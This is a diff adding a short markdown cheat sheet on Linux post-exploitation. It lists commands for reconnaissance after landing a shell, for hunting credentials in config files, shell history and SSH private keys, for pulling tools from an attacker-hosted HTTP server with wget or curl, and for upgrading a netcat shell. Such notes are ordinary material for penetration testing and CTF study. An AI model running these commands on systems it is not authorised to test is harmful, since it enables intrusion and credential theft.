@@ -1,0 +1,47 @@
+# Linux Post Exploitation
+
+## Situational Awareness
+
+Get your bearings immediately after landing a shell: know what you're on, who you are, and what network you can reach before doing anything else.
+
+```bash
+whoami; id
+hostname; uname -a
+ip a; ip route
+cat /etc/hosts
+ps aux
+env
+```
+
+## Credential Hunting
+
+Config files, shell history, and SSH keys are the highest-yield targets: grep broadly and follow the trail.
+
+```bash
+find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
+cat ~/.bash_history
+cat ~/.ssh/id_rsa
+find / -name "id_rsa" 2>/dev/null
+grep -r "password" /var/www/html/ 2>/dev/null
+```
+
+## File Transfer
+
+Stand up a quick HTTP server on the attacker machine and pull files down with wget or curl: works in almost every environment.
+
+```bash
+python3 -m http.server 8080
+wget http://<IP>:8080/file
+curl http://<IP>:8080/file -o file
+```
+
+## Shell Upgrade
+
+Raw netcat shells are fragile: upgrade to a full PTY immediately so you get job control, tab completion, and proper signal handling.
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# CTRL+Z
+stty raw -echo; fg
+export TERM=xterm
+```
